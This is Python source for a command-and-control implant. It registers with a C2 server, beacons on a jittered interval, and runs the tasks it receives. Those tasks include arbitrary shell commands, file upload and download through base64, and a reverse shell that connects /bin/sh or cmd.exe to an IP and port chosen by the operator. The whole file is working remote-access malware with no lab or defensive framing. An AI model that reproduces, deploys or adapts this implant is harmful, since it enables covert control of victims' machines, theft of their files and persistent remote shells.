import requests
import time
import platform
import socket
import subprocess
import os
import random
import sys

# Configuration
SERVER_URL = "http://127.0.0.1:8000"
SLEEP_INTERVAL = 5
JITTER = 2
AGENT_ID = None

def register():
    """Register the agent with the C2 server."""
    global AGENT_ID
    url = f"{SERVER_URL}/api/register"
    data = {
        "hostname": socket.gethostname(),
        "ip": socket.gethostbyname(socket.gethostname()),
        "os": f"{platform.system()} {platform.release()}"
    }
    
    try:
        print(f"[*] Attempting to register with {SERVER_URL}...")
        response = requests.post(url, json=data)
        if response.status_code == 200:
            AGENT_ID = response.json()["id"]
            print(f"[+] Registered successfully. Agent ID: {AGENT_ID}")
            return True
        else:
            print(f"[-] Registration failed: {response.text}")
            return False
    except Exception as e:
        print(f"[-] Error during registration: {e}")
        return False

def execute_task(task):
    """Execute a task received from the server."""
    print(f"[*] Executing task {task['id']}: {task['command']}")
    output = ""
    try:
        if task['command'] == "shell":
            # Execute shell command
            cmd = task['arguments']
            result = subprocess.run(
                cmd, 
                shell=True, 
                capture_output=True, 
                text=True
            )
            output = result.stdout + result.stderr
        elif task['command'] == "whoami":
            # Built-in whoami
            output = os.getlogin()
        elif task['command'] == "sleep":
            # Change sleep interval (temporary)
            global SLEEP_INTERVAL
            SLEEP_INTERVAL = int(task['arguments'])
            output = f"Sleep interval changed to {SLEEP_INTERVAL}s"
        elif task['command'] == "upload":
            # Server -> Agent (Write file)
            # Args: <path> <base64_content>
            try:
                path, content = task['arguments'].split(" ", 1)
                import base64
                with open(path, "wb") as f:
                    f.write(base64.b64decode(content))
                output = f"File written to {path}"
            except Exception as e:
                output = f"Failed to write file: {e}"
        elif task['command'] == "download":
            # Agent -> Server (Read file)
            # Args: <path>
            try:
                path = task['arguments'].strip()
                import base64
                if os.path.exists(path):
                    with open(path, "rb") as f:
                        content = base64.b64encode(f.read()).decode()
                    output = content
                else:
                    output = "File not found"
            except Exception as e:
                output = f"Failed to read file: {e}"
            except Exception as e:
                output = f"Failed to read file: {e}"
        elif task['command'] == "reverse_shell":
            # Args: <ip> <port>
            try:
                ip, port = task['arguments'].split(" ")
                import threading
                def run_shell(ip, port):
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    try:
                        s.connect((ip, int(port)))
                        if platform.system() == "Windows":
                            subprocess.call(["cmd.exe"], stdin=s, stdout=s, stderr=s)
                        else:
                            os.dup2(s.fileno(), 0)
                            os.dup2(s.fileno(), 1)
                            os.dup2(s.fileno(), 2)
                            subprocess.call(["/bin/sh", "-i"])
                    except Exception as e:
                        pass
                    finally:
                        s.close()
                
                t = threading.Thread(target=run_shell, args=(ip, port))
                t.daemon = True
                t.start()
                output = f"Reverse shell spawned to {ip}:{port}"
            except Exception as e:
                output = f"Failed to spawn shell: {e}"
        else:
            output = "Unknown command"
    except Exception as e:
        output = f"Error executing task: {str(e)}"
    
    # Send results
    submit_result(task['id'], output)

def submit_result(task_id, output):
    """Submit the result of a task to the server."""
    url = f"{SERVER_URL}/api/results"
    data = {
        "task_id": task_id,
        "output": output
    }
    try:
        requests.post(url, json=data)
        print(f"[+] Result submitted for task {task_id}")
    except Exception as e:
        print(f"[-] Failed to submit result: {e}")

def beacon():
    """Send a heartbeat to the server and check for tasks."""
    url = f"{SERVER_URL}/api/beacon/{AGENT_ID}"
    try:
        response = requests.post(url)
        if response.status_code == 200:
            tasks = response.json()
            if tasks:
                print(f"[*] Received {len(tasks)} tasks")
                for task in tasks:
                    execute_task(task)
        else:
            print(f"[-] Beacon failed: {response.status_code}")
    except Exception as e:
        print(f"[-] Beacon error: {e}")

def main():
    if not register():
        sys.exit(1)
    
    print("[*] Starting beacon loop...")
    while True:
        beacon()
        
        # Sleep with jitter
        sleep_time = SLEEP_INTERVAL + random.uniform(0, JITTER)
        time.sleep(sleep_time)

if __name__ == "__main__":
    main()
